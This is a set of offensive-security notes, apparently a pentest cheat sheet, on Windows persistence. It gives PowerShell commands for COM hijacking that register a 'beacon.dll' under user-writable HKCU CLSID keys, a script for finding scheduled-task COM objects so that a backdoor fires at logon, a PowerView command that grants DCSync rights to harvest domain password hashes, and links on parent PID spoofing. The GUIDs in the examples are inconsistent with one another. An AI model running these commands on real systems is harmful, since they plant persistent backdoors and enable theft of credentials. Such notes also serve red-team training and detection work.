## COM Hijacking
### Searching non existent COM components
As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:

* **RegOpenKey** operations.
* where the _Result_ is **NAME NOT FOUND**.
* and the _Path_ ends with **InprocServer32**.
    
Once you have decided which not existent COM to impersonate execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._

```
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable task scheduler COM components
Windows Tasks actually use Custom Triggers to call COM objects. And because they're executed via the Task Scheduler, it's easier to predict when they're going to be triggered.
```
# Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
# Task Name:  Example
# Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]
```
Checking the output you can select one that is going to be executed **every time a user logs in** for example.

Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY_****_CLASSES__****ROOT\\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU
```
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
## DCSync
If you are a domain admin, you can grant this permissions to any user :
```
# Powerview
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
In this way, anytime you want to pull passwords hashes just do DCSync.
## Parent PID spoofing
[Parent PID Spoofing - Pentest Everything (gitbook.io)](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/access-token-manipultion/parent-pid-spoofing)
[Parent Process ID (PPID) Spoofing - Red Teaming Experiments (ired.team)](https://www.ired.team/offensive-security/defense-evasion/parent-process-id-ppid-spoofing)

## Ressources
[COM Hijacking - HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/com-hijacking)
[DCSync - HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
